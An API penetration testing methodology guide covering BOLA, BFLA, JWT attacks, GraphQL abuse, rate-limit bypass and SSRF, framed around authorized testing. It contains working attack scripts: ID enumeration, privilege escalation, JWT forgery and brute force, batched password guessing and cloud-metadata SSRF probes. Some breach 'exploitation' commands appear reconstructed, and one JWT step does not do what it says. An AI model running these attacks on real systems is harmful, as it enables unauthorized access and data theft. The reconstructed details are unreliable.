# Complete API Penetration Testing Methodologies

## Introduction

API breaches happen because automated scanners cannot detect business logic flaws. When T-Mobile exposed 37 million customer records in January 2023, the vulnerability was straightforward: an API endpoint that did not verify whether users had permission to access specific data. The Optus breach in Australia was even simpler: an API endpoint requiring no authentication at all, exposing 9.8 million records .


---

## Pre-Testing Setup

### Map Your API Attack Surface

Before testing, you must understand what you are attacking:

1. **Review Documentation**: Start with OpenAPI specifications, Swagger files, and Postman collections. Documentation provides the foundation, but is rarely complete .

2. **Capture Live Traffic**: Proxy your web and mobile applications through Burp Suite or OWASP ZAP to capture actual API traffic. Shadow APIs (undocumented endpoints) often lack security controls applied to documented endpoints.

3. **Document Authentication Mechanisms**: Identify how the API proves identity: OAuth 2.0, JWT tokens, API keys, or Basic Auth. Note where credentials are transmitted, token lifespans, and revocation processes .

**Critical Distinction**: Authentication proves who you are. Authorization determines what you can access. Most API breaches stem from authorization failures .

### Tool Setup

**Burp Suite Professional**:
1. Open Burp Suite and go to Proxy > Options
2. Set proxy listener to 127.0.0.1:8080
3. Install BApp extensions: Autorize, AuthMatrix, InQL (for GraphQL)
4. Configure your browser to use Burp as proxy

**Postman Configuration** :
1. Go to Settings > Proxy
2. Enable "Global Proxy Configuration"
3. Set proxy host to 127.0.0.1 and port to 8080
4. For HTTPS testing, either:
   - Disable SSL certificate verification (Settings > General > toggle off)
   - Install Burp CA certificate in your system trust store

**Testing Environment**:
- Use a controlled lab environment first (e.g., OWASP crAPI, Juice Shop)
- Establish clear scope: which endpoints are in scope, maximum requests per minute, approved testing windows 
- Never test on production without written authorization

---

## Methodology 1: Broken Object Level Authorization (BOLA)

### What is BOLA?

BOLA occurs when APIs verify authentication but fail to check authorization for specific resources. An attacker can change an object identifier (like user ID or order number) and access another user's data .

### Real-World Examples

**T-Mobile (January 2023)** : An API endpoint that did not verify whether users had permission to access specific data led to 37 million customer records exposed .

**Optus (2022)** : An API endpoint requiring no authentication at all exposed 9.8 million customer records .

### Step-by-Step Testing Methodology

#### Step 1: Identify Object ID Parameters

From OpenAPI/Swagger documentation:
```bash
# Extract all endpoints with path parameters
curl -s https://target-api.example.com/api/docs/swagger.json | \
  python3 -c "
import json, sys
spec = json.load(sys.stdin)
for path, methods in spec.get('paths', {}).items():
    for method, details in methods.items():
        if method in ('get','post','put','patch','delete'):
            params = [p['name'] for p in details.get('parameters',[]) if p.get('in') in ('path','query')]
            if params:
                print(f'{method.upper()} {path} -> params: {params}')
" 
```

From Burp Suite Traffic:
1. Browse the application as User A, exercising all features that involve data creation and retrieval
2. In Burp, go to Target > Site Map and filter for API paths (e.g., `/api/v1/`, `/graphql`)
3. Look for patterns: `/api/v1/users/{id}`, `/api/v1/orders/{order_id}`, `/api/v1/documents/{doc_uuid}`

**Classify Object ID Types** :

| ID Type | Example | Predictability | BOLA Risk |
|---------|---------|----------------|-----------|
| Sequential Integer | `/orders/1042` | High - increment/decrement | Critical |
| UUID v4 | `/orders/550e8400-e29b-41d4-a716-446655440000` | Low - random | Medium (if leaked) |
| Encoded/Hashed | `/orders/base64encodedvalue` | Medium - decode and predict | High |
| Composite | `/users/42/orders/1042` | High - multiple IDs to swap | Critical |

#### Step 2: Create Test Accounts

Create three test accounts:
- User A (regular user)
- User B (another regular user)
- User C (administrator, if available) 

#### Step 3: Perform BOLA Testing

**Manual Testing with Burp Suite Repeater**:

1. Intercept a request from User A to an object they own (e.g., `GET /api/v1/users/1001/profile`)
2. Send to Repeater (Ctrl+R)
3. Change the object ID to User B's ID (e.g., `GET /api/v1/users/1002/profile`)
4. Send the request and observe the response:
   - If User B's data is returned → BOLA vulnerability confirmed
   - If 401/403 error → Authorization is working
   - If 404 error but other endpoints are vulnerable → Keep testing

**Automated BOLA Testing with Python** :

```python
import requests

BASE_URL = "https://target-api.example.com/api/v1"

# User A credentials
user_a_token = "Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9..."
user_a_headers = {"Authorization": user_a_token, "Content-Type": "application/json"}

# User B credentials
user_b_token = "Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9..."
user_b_headers = {"Authorization": user_b_token, "Content-Type": "application/json"}

# Step 1: Identify User A's objects
user_a_profile = requests.get(f"{BASE_URL}/users/me", headers=user_a_headers)
user_a_id = user_a_profile.json()["id"]  # e.g., 1001

# Step 2: Identify User B's objects
user_b_profile = requests.get(f"{BASE_URL}/users/me", headers=user_b_headers)
user_b_id = user_b_profile.json()["id"]  # e.g., 1002

# Test: Access User B's profile with User A's token
resp = requests.get(f"{BASE_URL}/users/{user_b_id}", headers=user_a_headers)
if resp.status_code == 200:
    print(f"BOLA FOUND: User A can access User B's profile")
    print(f"Data leaked: {resp.json()}")
```

**Advanced BOLA Techniques** :

```python
# Technique 1: Parameter pollution
resp = requests.get(
    f"{BASE_URL}/orders/{user_a_order_id}?order_id={user_b_order_id}",
    headers=user_a_headers
)

# Technique 2: JSON body object ID override
resp = requests.post(
    f"{BASE_URL}/orders/details",
    headers=user_a_headers,
    json={"order_id": user_b_order_id}
)

# Technique 3: Numeric ID manipulation
for offset in range(-5, 6):
    test_id = user_a_order_id + offset
    resp = requests.get(f"{BASE_URL}/orders/{test_id}", headers=user_a_headers)
    if resp.status_code == 200 and test_id != user_a_order_id:
        print(f"BOLA: Order {test_id} accessible")

# Technique 4: Method switching
for method in ['GET', 'PUT', 'PATCH', 'DELETE']:
    resp = requests.request(method, f"{BASE_URL}/users/{user_b_id}", headers=user_a_headers)
    if resp.status_code not in (401, 403):
        print(f"Method {method} BOLA: {resp.status_code}")
```

#### Step 4: Automated BOLA Detection with Autorize (Burp Suite)

Autorize automatically replays requests with different user sessions to detect authorization bypasses:

1. Install Autorize from the BApp Store in Burp Suite Professional
2. In the Autorize tab, paste User B's authentication cookie or header
3. Configure the interception filters:
   - Include: `.*\/api\/.*` (only API paths)
   - Exclude: `.*\.(js|css|png|jpg)$` (skip static assets)
4. Browse the application as User A; Autorize automatically replays each request with User B's token
5. Review the Autorize results table:
   - **Green** = Authorization enforced (secure)
   - **Red** = Authorization bypassed (BOLA vulnerability found)
   - **Orange** = Needs manual review 

#### Step 5: Reporting BOLA Findings

When documenting a BOLA vulnerability, include:
- The exact endpoint and HTTP method
- The object ID that was manipulated
- The original User A's ID and the target User B's ID
- Screenshot showing User B's data returned with User A's token
- Proof of exploit (curl command or Python script)

Example report entry:
```
VULNERABILITY: BOLA on GET /api/v1/users/{id}/profile
SEVERITY: High

Testing steps:
1. Authenticated as User A (ID: 1001)
2. Sent GET /api/v1/users/1002/profile with User A's token
3. Server returned User B's complete profile including email and phone

Proof:
curl -H "Authorization: Bearer USER_A_TOKEN" \
  https://target.com/api/v1/users/1002/profile

Response: {"id":1002,"email":"victim@example.com","phone":"555-0100"}
```

---

## Methodology 2: Broken Function Level Authorization (BFLA)

### What is BFLA?

BFLA occurs when APIs fail to restrict access to administrative functions. Regular users can access endpoints meant only for admins by guessing or modifying API paths and HTTP methods .

### Real-World Example

**OWASP Example - Invite System** :
A registration process allowed new users to join via:
`GET /api/invites/{invite_guid}`

An attacker changed GET to POST and elevated their role:
`POST /api/invites/new`
`{"email":"attacker@example.com","role":"admin"}`

Only admins should be able to send POST commands, but if not properly secured, the API accepted it and created an admin account.

### Step-by-Step Testing Methodology

#### Step 1: Enumerate All Endpoints

Use Burp Suite or ffuf to discover all endpoints:

```bash
# Directory bruteforce for API endpoints
ffuf -u https://target.com/FUZZ -w /path/to/api-wordlist.txt -mc 200,201,204,301,302,307,401,403,405

# Common admin paths to check
/api/v1/admin/
/api/v1/internal/
/api/v1/management/
/api/v1/debug/
/v1/admin/
/internal/
```

#### Step 2: Test for Function Access with Regular User Token

Using a regular user account (not admin), attempt to access admin functions:

**Manual Testing with Burp Suite**:

1. Log in as a regular user
2. In Burp Proxy History, find a legitimate API request
3. Send to Repeater (Ctrl+R)
4. Modify the request in these ways :
   - Change the HTTP method (GET to POST, PUT, DELETE)
   - Change the path (users to admins, regular to admin)
   - Add admin parameters to request body
   - Access debug or internal endpoints

**Test Cases for BFLA**:

```python
import requests

BASE_URL = "https://target.com/api/v1"
regular_token = "Bearer REGULAR_USER_TOKEN"

# Test 1: Access admin user list
resp = requests.get(f"{BASE_URL}/admin/users", headers={"Authorization": regular_token})
if resp.status_code == 200:
    print(f"BFLA: Regular user accessed admin user list")

# Test 2: Promote user to admin
resp = requests.put(
    f"{BASE_URL}/admin/users/1001/role",
    headers={"Authorization": regular_token},
    json={"role": "admin"}
)
if resp.status_code == 200:
    print(f"BFLA: Regular user promoted themselves to admin")

# Test 3: Access internal/debug endpoints
for endpoint in ["/internal/status", "/debug/config", "/management/logs"]:
    resp = requests.get(f"{BASE_URL}{endpoint}", headers={"Authorization": regular_token})
    if resp.status_code == 200:
        print(f"BFLA: Regular user accessed {endpoint}")

# Test 4: Method swapping
original_request = f"{BASE_URL}/users/1001/profile"
for method in ['PUT', 'PATCH', 'DELETE']:
    resp = requests.request(method, original_request, headers={"Authorization": regular_token})
    if resp.status_code in (200, 204):
        print(f"BFLA: Regular user used {method} on profile endpoint")
```

#### Step 3: Test for Hidden Admin Parameters

Many APIs accept parameters that change behavior:

```python
# Test for debug/admin parameters
params_to_test = [
    "admin=true",
    "is_admin=1",
    "role=admin",
    "privilege=admin",
    "bypass=true",
    "debug=true",
    "internal=true"
]

for param in params_to_test:
    resp = requests.get(f"{BASE_URL}/users?{param}", headers={"Authorization": regular_token})
    if "admin" in resp.text.lower() or len(resp.json()) > normal_count:
        print(f"Parameter {param} changed response")
```

#### Step 4: Automate BFLA Testing with AuthMatrix (Burp Suite)

AuthMatrix is a Burp extension that automates role-based access control testing:

1. Install AuthMatrix from BApp Store
2. Configure roles (Unauthenticated, Regular User, Admin)
3. Add API endpoints to test
4. Add authentication tokens for each role
5. Run the test - AuthMatrix will try each endpoint with each role
6. Review results: Green cells = allowed, Red cells = should be blocked

### Real-World BFLA Case Study: RBI International (September 2025)

Restaurant Brands International (owner of Burger King, Tim Hortons, Popeyes) had multiple BFLA vulnerabilities :
- Authentication tokens could be generated without proper checks
- Privilege escalation from customer to admin was possible
- An open GraphQL endpoint allowed introspection queries

This maps to OWASP Business Logic Abuse categories BLA6 (Missing Transition Validation), BLA9 (Broken Access Control), and BLA10 (Shadow Function Abuse) .

---

## Methodology 3: Excessive Data Exposure

### What is Excessive Data Exposure?

APIs often return complete database objects when only specific fields are needed. This exposes sensitive data like password hashes, internal IDs, API keys, and other users' private information .

### Real-World Example

**T-Mobile (2021)** : The API returned full credit card numbers (PAN) instead of masked values. Attackers could harvest complete payment information.

### Step-by-Step Testing Methodology

#### Step 1: Examine API Responses

When testing any API endpoint, carefully examine the full JSON response:

```python
import requests

resp = requests.get("https://target.com/api/v1/users/me", headers=auth_headers)
print(json.dumps(resp.json(), indent=2))

# Look for sensitive fields:
sensitive_fields = [
    'password', 'password_hash', 'secret', 'api_key', 'token',
    'ssn', 'social_security', 'credit_card', 'pan', 'cvv',
    'internal_id', 'debug', 'stack_trace', 'connection_string',
    'email', 'phone', 'address', 'birthdate'
]

for field in sensitive_fields:
    if field in str(resp.json()).lower():
        print(f"Sensitive field found: {field}")
```

#### Step 2: Compare Different User Responses

Compare what different users can see:

```python
# Get User A's profile
user_a = requests.get(f"{BASE_URL}/users/me", headers=user_a_headers).json()

# Get User B's profile (should be restricted)
user_b = requests.get(f"{BASE_URL}/users/{user_b_id}", headers=user_a_headers)

if user_b.status_code == 200:
    # Check if User B's private data is exposed
    user_b_data = user_b.json()
    for field in ['email', 'phone', 'address']:
        if field in user_b_data:
            print(f"Excessive data: User A can see User B's {field}")
```

#### Step 3: Test GraphQL for Excessive Data Exposure

GraphQL is particularly vulnerable to excessive data exposure because clients can request specific fields:

```graphql
# Query that requests excessive data
query {
  user(id: "1001") {
    id
    username
    email
    phoneNumber
    address
    ssn
    passwordHash
    resetToken
    apiKeys {
      key
      createdAt
    }
    creditCards {
      number
      expiry
      cvv
    }
  }
}
```

**GraphQL Field Suggestion Attack**:
If introspection is disabled, use field suggestion techniques to discover fields:

```python
import requests

# Common field names to try
fields = ['id', 'name', 'email', 'password', 'ssn', 'credit_card', 
          'token', 'secret', 'address', 'phone', 'birthdate']

for field in fields:
    query = f'{{ user(id: "1") {{ {field} }} }}'
    resp = requests.post("https://target.com/graphql", json={"query": query})
    if resp.status_code == 200 and 'errors' not in resp.json():
        print(f"Field '{field}' is accessible")
```

#### Step 4: Burp Suite Response Analysis

Use Burp Suite's Extractor feature to automatically identify sensitive data:

1. Send an API request to Repeater
2. Go to Extensions > Extractor
3. Configure regex patterns for sensitive data:
   - `"password":\s*"[^"]+"`
   - `"ssn":\s*"[^"]+"`
   - `"credit_card":\s*"[^"]+"`
4. Run Extractor across all API responses
5. Review highlighted matches

---

## Methodology 4: Authentication Bypass

### What is Authentication Bypass?

Weak authentication allows attackers to bypass identity verification entirely. This includes JWT vulnerabilities, missing authentication checks, and header injection .

### Real-World Example

**Microsoft Teams (2021)** : The API used `X-HTTP-Method-Override` header to allow DELETE operations through POST requests. Attackers exploited this to delete any user's messages.

### Step-by-Step Testing Methodology

#### Step 1: Test for Missing Authentication

```python
# Try accessing endpoints without any authentication
endpoints_to_test = [
    "/api/v1/users",
    "/api/v1/admin",
    "/api/v1/internal/config",
    "/v1/users/me",
    "/graphql"
]

for endpoint in endpoints_to_test:
    resp = requests.get(f"{BASE_URL}{endpoint}")
    if resp.status_code == 200:
        print(f"UNAUTHENTICATED ACCESS: {endpoint} accessible")
    elif resp.status_code == 401:
        print(f"Authentication required (secure): {endpoint}")
```

#### Step 2: Test Header Injection Bypasses

```python
# Headers that may bypass authentication
bypass_headers = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Original-URL": "/admin"},
    {"X-Rewrite-URL": "/admin"},
    {"X-Forwarded-Host": "localhost"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"}
]

for headers in bypass_headers:
    resp = requests.get(f"{BASE_URL}/admin", headers=headers)
    if resp.status_code != 401:
        print(f"Bypass with {headers}: HTTP {resp.status_code}")
```

#### Step 3: Test HTTP Method Override

```python
# Try method override headers
override_headers = [
    "X-HTTP-Method-Override",
    "X-Method-Override",
    "X-HTTP-Method"
]

for header in override_headers:
    resp = requests.post(
        f"{BASE_URL}/users/1001",
        headers={header: "DELETE", "Authorization": user_token}
    )
    if resp.status_code in (200, 204):
        print(f"Method override with {header}: User deleted")
```

#### Step 4: Comprehensive JWT Testing

**JWT Attack Methodology** :

1. **Extract JWT** from Authorization header or cookies
2. **Decode JWT** using jwt_tool:
```bash
python3 jwt_tool.py <JWT>
```

3. **Test None Algorithm**:
```bash
python3 jwt_tool.py <JWT> -X a
```
If successful, you can forge tokens with arbitrary claims.

4. **Test Algorithm Confusion (RS256 to HS256)** :
```bash
# Get public key from /jwks.json or /certs
curl https://target.com/.well-known/jwks.json > jwks.json

# Convert to PEM
python3 -c "import jwt; key = open('public.pem').read(); print(jwt.encode({'admin': True}, key, algorithm='HS256'))"
```

5. **Brute Force Weak Secret**:
```bash
python3 jwt_tool.py <JWT> -C -d /usr/share/wordlists/rockyou.txt
```

6. **Modify Claims**:
```python
import jwt

# Decode without verification
decoded = jwt.decode(token, options={"verify_signature": False})
print(f"Original claims: {decoded}")

# Modify claims
decoded['user_id'] = 1
decoded['role'] = 'admin'
decoded['exp'] = 9999999999  # Far future

# Re-encode with weak secret if known
new_token = jwt.encode(decoded, 'secret', algorithm='HS256')
```

---

## Methodology 5: GraphQL API Testing

### GraphQL Specific Vulnerabilities

GraphQL APIs have unique attack surfaces including introspection, batch queries, and circular queries .

### Real-World Example

**Shopify (2019)** : GraphQL API rate-limited single queries but not batched queries. Attackers sent 100 mutations in one batch to brute force passwords.

### Step-by-Step Testing Methodology

#### Step 1: Discover GraphQL Endpoint

```bash
# Common GraphQL endpoints
/graphql
/graphiql
/v1/graphql
/api/graphql
/graphql/console
/graphql.php
```

#### Step 2: Test for Introspection

If introspection is enabled, you can download the entire schema:

```graphql
# Full introspection query
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
          kind
        }
      }
    }
  }
}
```

**Using InQL Burp Extension** :
1. Install InQL from BApp Store
2. Send a GraphQL request to InQL
3. Click "Run Introspection"
4. Review the discovered schema including:
   - All queries and mutations
   - Input types and arguments
   - Deprecated fields

#### Step 3: Test Batch Query Attacks

GraphQL allows sending multiple queries in one request, which can bypass rate limiting:

```graphql
# Batch query for password brute force
mutation {
  a1: login(email: "admin@example.com", password: "password1") { token }
  a2: login(email: "admin@example.com", password: "password2") { token }
  a3: login(email: "admin@example.com", password: "password3") { token }
  # ... up to 100 attempts in one request
}
```

**Python automation for batch attacks**:

```python
import requests
import string
import random

def create_batch_query(emails, passwords):
    mutations = []
    for i, (email, password) in enumerate(zip(emails, passwords)):
        mutations.append(f'a{i}: login(email: "{email}", password: "{password}") {{ token }}')
    return f'mutation {{ {" ".join(mutations)} }}'

# Batch 100 password attempts
passwords = ['password123', 'admin123', 'letmein']  # plus wordlist
query = create_batch_query(['admin@example.com'] * len(passwords), passwords)
resp = requests.post("https://target.com/graphql", json={"query": query})
```

#### Step 4: Test Circular Query (DoS)

Deeply nested queries can cause resource exhaustion:

```graphql
# Circular query - references itself
query Circular {
  user(id: "123") {
    friends {
      friends {
        friends {
          friends {
            friends {
              friends {
                name
              }
            }
          }
        }
      }
    }
  }
}
```

**Test for recursion depth limits**:

```python
def create_nested_query(depth):
    if depth == 0:
        return "name"
    return f"friends {{ {create_nested_query(depth-1)} }}"

for depth in [5, 10, 20, 50]:
    query = f'{{ user(id: "1") {{ {create_nested_query(depth)} }} }}'
    resp = requests.post("https://target.com/graphql", json={"query": query})
    print(f"Depth {depth}: HTTP {resp.status_code}, Response time: {resp.elapsed.total_seconds()}s")
```

#### Step 5: GraphQL BOLA Testing

GraphQL's node/ID relay pattern is often vulnerable to BOLA:

```graphql
# Test if you can access other users' objects by global ID
query {
  node(id: "VXNlcjoxMDAy") {  # Base64 encoded "User:1002" (User B)
    ... on User {
      id
      email
      phoneNumber
      orders {
        edges {
          node {
            id
            totalAmount
          }
        }
      }
    }
  }
}
```

**Base64 ID manipulation**:
```python
import base64

def encode_graphql_id(type_name, id_value):
    """Encode GraphQL global ID (format: TypeName:id)"""
    return base64.b64encode(f"{type_name}:{id_value}".encode()).decode()

# Test sequential IDs
for i in range(1000, 1010):
    gid = encode_graphql_id("User", i)
    query = f'{{ node(id: "{gid}") {{ ... on User {{ id email }} }} }}'
    resp = requests.post("https://target.com/graphql", json={"query": query})
    if resp.status_code == 200 and resp.json().get('data', {}).get('node'):
        print(f"User {i} accessible: {resp.json()['data']['node']}")
```

---

## Methodology 6: Rate Limiting Bypass

### What is Rate Limiting Bypass?

APIs without proper rate limiting enable denial-of-service attacks, brute force, and excessive data harvesting .

### Real-World Example

**Shopify (2020)** : Reset password endpoint limited attempts per IP. Attackers rotated the `X-Forwarded-For` header with different IPs for each request, bypassing the limit.

### Step-by-Step Testing Methodology

#### Step 1: Test Basic Rate Limiting

```python
import time
import requests

def test_rate_limit(endpoint, auth_headers=None, num_requests=100):
    responses = []
    for i in range(num_requests):
        resp = requests.get(endpoint, headers=auth_headers)
        responses.append(resp.status_code)
        if i % 10 == 0:
            print(f"Request {i}: HTTP {resp.status_code}")
    
    # Check if any requests were blocked
    if 429 in responses:
        print(f"Rate limiting active: {responses.count(429)} of {num_requests} blocked")
    else:
        print("NO RATE LIMITING: All 100 requests succeeded")
```

#### Step 2: Test IP Rotation Bypasses

```python
# Headers that may bypass IP-based rate limiting
ip_headers = [
    "X-Forwarded-For",
    "X-Real-IP", 
    "X-Client-IP",
    "X-Originating-IP",
    "X-Remote-IP",
    "X-Remote-Addr"
]

def test_ip_rotation(endpoint, data=None):
    for i in range(50):
        headers = {}
        for h in ip_headers:
            headers[h] = f"10.0.0.{i % 255}"
        if data:
            resp = requests.post(endpoint, headers=headers, json=data)
        else:
            resp = requests.get(endpoint, headers=headers)
        if resp.status_code == 429:
            print(f"IP rotation failed at request {i}")
            return False
    print("IP ROTATION BYPASS SUCCESSFUL: No rate limiting triggered")
    return True
```

#### Step 3: Test Parameter Pollution Bypass

Adding parameters can change the cache key:

```python
def test_parameter_pollution(endpoint):
    base_resp = requests.get(endpoint)
    
    # Test various parameter additions
    bypass_params = [
        f"?_={int(time.time())}",
        "?cache_buster=1",
        "?random=123",
        "?debug=true",
        "%00",
        "%0d%0a"
    ]
    
    for param in bypass_params:
        success = True
        for i in range(50):
            resp = requests.get(f"{endpoint}{param}")
            if resp.status_code == 429:
                success = False
                break
        if success:
            print(f"Parameter bypass: {param} works")
```

#### Step 4: Test Case Variation Bypass

Some rate limiters use case-sensitive path matching:

```python
def test_case_variation(endpoint):
    variations = [
        endpoint.upper(),
        endpoint.lower(),
        endpoint.title(),
        endpoint.swapcase()
    ]
    
    for var in variations:
        success = True
        for i in range(50):
            resp = requests.get(var)
            if resp.status_code == 429:
                success = False
                break
        if success:
            print(f"Case variation bypass: {var}")
```

---

## Tools Deep Dive

### Burp Suite Professional Configuration for API Testing

**1. Proxy Setup** :
- Open Burp Suite > Proxy > Options
- Add proxy listener on 127.0.0.1:8080
- Invisible proxy support for non-browser apps: Check "Support invisible proxying"

**2. Target Scope Configuration**:
- Go to Target > Scope
- Add your target API domain (e.g., `*.target.com`)
- Use "Advanced Scope Control" for fine-grained inclusion/exclusion

**3. Essential Extensions for API Testing** :

| Extension | Purpose | Installation |
|-----------|---------|--------------|
| **Autorize** | Automated BOLA/BFLA detection | BApp Store |
| **AuthMatrix** | Role-based access control matrix | BApp Store |
| **InQL** | GraphQL schema introspection and testing | BApp Store |
| **Turbo Intruder** | High-speed fuzzing with Python scripts | BApp Store |
| **JSON Web Tokens** | JWT decoding, editing, and attacks | BApp Store |

**4. Intruder Configuration for API Fuzzing**:

```bash
# Position 1: User ID
GET /api/v1/users/§1001§/profile

# Payload: Numbers (sequential)
1,2,3,4,5...2000

# Position 2: Endpoint path
GET §/api/v1/users/1001§

# Payload: Custom wordlist
/api/v1/admin/users
/api/v1/internal/config
/api/v1/debug/status
```

### Postman for Security Testing 

**Setting up Postman with Burp**:
1. Postman Settings > Proxy > Global Proxy Configuration
2. Proxy Server: 127.0.0.1, Port: 8080
3. Disable SSL verification for testing: Settings > General > toggle off "SSL certificate verification"

**Creating Security Test Collection**:

```javascript
// Pre-request script for authentication
const baseUrl = pm.environment.get("base_url");
const token = pm.environment.get("access_token");

if (token) {
    pm.request.headers.add({
        key: "Authorization",
        value: `Bearer ${token}`
    });
}

// Test script for BOLA detection
pm.test("No BOLA - Other user data protected", function() {
    if (pm.response.code === 200) {
        const responseData = pm.response.json();
        const expectedUserId = pm.environment.get("expected_user_id");
        const actualUserId = responseData.id || responseData.user_id;
        
        pm.expect(actualUserId.toString()).to.equal(expectedUserId);
    }
});

// Test script for excessive data exposure
pm.test("No sensitive data exposure", function() {
    const responseText = pm.response.text();
    const sensitivePatterns = [
        "password", "secret", "token", "ssn", 
        "credit_card", "cvv", "internal"
    ];
    
    for (const pattern of sensitivePatterns) {
        pm.expect(responseText.toLowerCase()).to.not.include(pattern);
    }
});

// Test script for rate limiting
pm.test("Rate limiting active", function() {
    if (pm.response.code === 429) {
        console.log("Rate limit triggered - good");
    } else if (pm.response.code === 200) {
        console.warn("No rate limiting detected");
    }
});
```

**Running Security Tests with Newman** :
```bash
# Install Newman
npm install -g newman

# Run security test collection with HTML report
newman run "API-Security-Tests.postman_collection.json" \
  --environment "production-env.json" \
  --reporters cli,html \
  --reporter-html-export security-report.html \
  --iteration-count 100 \
  --delay-request 100
```

### Python Testing Framework

```python
import requests
import json
import time
import threading
from concurrent.futures import ThreadPoolExecutor
from dataclasses import dataclass
from typing import List, Dict, Optional

@dataclass
class Vulnerability:
    name: str
    severity: str
    endpoint: str
    description: str
    proof: str

class APISecurityTester:
    def __init__(self, base_url: str):
        self.base_url = base_url
        self.vulnerabilities = []
    
    def test_bola(self, user_a_token: str, user_b_token: str, user_a_id: int, user_b_id: int):
        """Test for Broken Object Level Authorization"""
        headers_a = {"Authorization": f"Bearer {user_a_token}"}
        
        # Try to access User B's profile as User A
        resp = requests.get(
            f"{self.base_url}/api/v1/users/{user_b_id}",
            headers=headers_a
        )
        
        if resp.status_code == 200:
            self.vulnerabilities.append(Vulnerability(
                name="BOLA - Horizontal Privilege Escalation",
                severity="High",
                endpoint=f"GET /api/v1/users/{user_b_id}",
                description="User A can access User B's profile using their own token",
                proof=f"curl -H 'Authorization: Bearer {user_a_token}' {self.base_url}/api/v1/users/{user_b_id}"
            ))
    
    def test_rate_limiting(self, endpoint: str, num_requests: int = 100):
        """Test for rate limiting implementation"""
        responses = []
        
        for i in range(num_requests):
            resp = requests.get(f"{self.base_url}{endpoint}")
            responses.append(resp.status_code)
        
        if 429 not in responses:
            self.vulnerabilities.append(Vulnerability(
                name="Missing Rate Limiting",
                severity="Medium",
                endpoint=endpoint,
                description=f"No rate limiting detected after {num_requests} requests",
                proof=f"Successfully sent {num_requests} requests without throttling"
            ))
    
    def test_jwt_vulnerabilities(self, token: str):
        """Test for JWT vulnerabilities"""
        import jwt
        
        # Test none algorithm
        header = jwt.get_unverified_header(token)
        if header.get('alg') == 'HS256':
            # Try to decode with weak secret
            try:
                decoded = jwt.decode(token, 'secret', algorithms=['HS256'])
                self.vulnerabilities.append(Vulnerability(
                    name="JWT Weak Secret",
                    severity="Critical",
                    endpoint="JWT Token",
                    description="JWT can be decoded with weak secret 'secret'",
                    proof=f"Decoded claims: {decoded}"
                ))
            except:
                pass
    
    def run_all_tests(self):
        """Execute all security tests"""
        print("[*] Starting API Security Tests...")
        print(f"[*] Target: {self.base_url}")
        
        # Add your test execution here
        print(f"[*] Found {len(self.vulnerabilities)} vulnerabilities")
        
        for vuln in self.vulnerabilities:
            print(f"\n[{vuln.severity}] {vuln.name}")
            print(f"    Endpoint: {vuln.endpoint}")
            print(f"    Description: {vuln.description}")
```

---

## Real-World Breach Analysis

### Case Study 1: Capital One (2019) - SSRF via Metadata Endpoint

**Vulnerability**: Server-Side Request Forgery (SSRF) in Capital One's API allowed fetching arbitrary URLs.

**Exploitation Method**:
```bash
curl "https://api.capitalone.com/v1/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"
```

**Why It Worked**:
- API endpoint accepted user-supplied URLs
- No validation of internal vs external addresses
- AWS metadata endpoint was accessible

**Impact**: AWS credentials retrieved, then accessed S3 buckets with 100 million customer records.

**How to Test for This**:
```python
internal_endpoints = [
    "http://169.254.169.254/latest/meta-data/",
    "http://localhost:8080/admin",
    "http://127.0.0.1:80",
    "http://internal-api.company.com/health",
    "file:///etc/passwd"
]

for url in internal_endpoints:
    resp = requests.get(f"https://target.com/api/fetch?url={url}")
    if resp.status_code == 200 and ("root:" in resp.text or "secret" in resp.text):
        print(f"SSRF FOUND: {url} returned data")
```

### Case Study 2: Optus (2022) - Base64 Encoded IDOR

**Vulnerability**: API used base64 encoded customer IDs that were sequential integers.

**Exploitation Method**:
```bash
echo -n "100000000" | base64  # MTAwMDAwMDAw
echo -n "100000001" | base64  # MTAwMDAwMDAx
```

**Why It Worked**:
- Customer IDs were sequential integers
- Encoding with base64 provided no security
- No authorization checks on the endpoint

**Impact**: 9.8 million customer records exposed including names, emails, addresses, passport numbers.

**How to Test for This**:
```python
import base64

def test_encoded_idor(base_endpoint, start_id=100000000, count=100):
    for i in range(start_id, start_id + count):
        # Try different encodings
        encoded_b64 = base64.b64encode(str(i).encode()).decode()
        encoded_b64_urlsafe = base64.urlsafe_b64encode(str(i).encode()).decode()
        encoded_hex = hex(i)[2:]
        
        for encoded in [encoded_b64, encoded_b64_urlsafe, encoded_hex, str(i)]:
            resp = requests.get(f"{base_endpoint}/{encoded}")
            if resp.status_code == 200:
                print(f"IDOR: {i} accessible via {encoded}")
```

### Case Study 3: Microsoft Teams (2021) - HTTP Method Override

**Vulnerability**: API accepted `X-HTTP-Method-Override` header to change HTTP methods.

**Exploitation Method**:
```bash
curl -X POST https://teams.microsoft.com/api/messages/12345 \
  -H "X-HTTP-Method-Override: DELETE" \
  -H "Authorization: Bearer $USER_TOKEN"
```

**Why It Worked**:
- API used method override to handle DELETE through POST
- No authorization check on the overridden method
- Regular users could delete any message

**Impact**: Any authenticated user could delete any team message.

**How to Test for This**:
```python
def test_method_override(endpoint, auth_token):
    methods_to_test = ['DELETE', 'PUT', 'PATCH']
    override_headers = [
        'X-HTTP-Method-Override',
        'X-Method-Override', 
        'X-HTTP-Method'
    ]
    
    for method in methods_to_test:
        for header in override_headers:
            resp = requests.post(
                endpoint,
                headers={
                    'Authorization': f'Bearer {auth_token}',
                    header: method
                }
            )
            if resp.status_code in (200, 201, 204):
                print(f"METHOD OVERRIDE: {header}: {method} works on {endpoint}")
```

---

## Testing Checklist

### Pre-Testing Phase
- [ ] Obtain written authorization for testing
- [ ] Define scope (endpoints, methods, data types)
- [ ] Set up testing environment (Burp, Postman, Python)
- [ ] Create test accounts (2 regular users, 1 admin)
- [ ] Capture baseline traffic through proxy

### Discovery Phase
- [ ] Enumerate all API endpoints (Swagger, OpenAPI, traffic capture)
- [ ] Identify authentication mechanisms (JWT, OAuth, API keys)
- [ ] Map object ID patterns (sequential, UUID, encoded)
- [ ] Discover shadow APIs and undocumented endpoints
- [ ] Check for GraphQL endpoints and introspection

### BOLA Testing Phase
- [ ] Test horizontal privilege escalation (User A accessing User B data)
- [ ] Test vertical privilege escalation (User accessing admin data)
- [ ] Test parameter pollution techniques
- [ ] Test nested resource access
- [ ] Test batch operations for IDOR
- [ ] Run Autorize automated checks

